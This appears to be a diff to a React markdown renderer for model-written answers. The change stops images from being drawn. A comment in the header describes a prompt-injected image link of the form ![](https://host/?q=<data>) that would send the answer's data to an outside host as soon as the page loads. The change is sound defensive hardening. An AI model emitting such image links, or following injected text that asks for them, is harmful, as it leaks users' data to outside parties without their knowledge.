@@ -3,6 +3,8 @@
  * with the `[n]` citation markers of the answer. The text comes from a model, so nothing in it is
  * trusted: raw HTML is not rendered, rehype-sanitize keeps only the elements and link protocols of
  * its default schema plus the citation marker, and a link opens in a new tab without an opener.
+ * Images are not drawn: a prompt-injected ![](https://host/?q=<data>) would load on sight and carry
+ * the answer's data away without a click, so an image shows as its alt text.
  * Prose is DA/Reading, as in "P01 · Hỏi đáp" (2296:18565).
  */
 import type { Root, Text } from 'mdast';
@@ -43,7 +45,7 @@ function remarkCitations() {
 
 const SCHEMA = {
   ...defaultSchema,
-  tagNames: [...(defaultSchema.tagNames ?? []), 'cite-ref'],
+  tagNames: [...(defaultSchema.tagNames ?? []).filter((tag) => tag !== 'img'), 'cite-ref'],
   attributes: { ...defaultSchema.attributes, 'cite-ref': ['dataIndex'] },
 };
 
@@ -151,6 +153,9 @@ export function MarkdownContent({
       <ReactMarkdown
         remarkPlugins={[remarkGfm, remarkCitations]}
         rehypePlugins={[[rehypeSanitize, SCHEMA]]}
+        // Before sanitizing: an image becomes its alt text, never a request.
+        disallowedElements={['img']}
+        unwrapDisallowed
         components={components}
       >
         {text}
